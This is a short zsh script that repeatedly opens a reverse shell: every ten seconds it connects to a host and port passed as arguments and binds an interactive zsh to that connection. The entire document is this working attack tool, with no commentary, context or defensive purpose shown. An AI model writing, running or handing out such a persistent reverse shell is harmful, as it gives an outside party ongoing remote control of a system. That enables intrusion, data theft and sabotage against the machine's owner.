while true; do
    sleep 10
    zsh -c 'zmodload zsh/net/tcp && ztcp '"$1"' '"$2"' && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'
done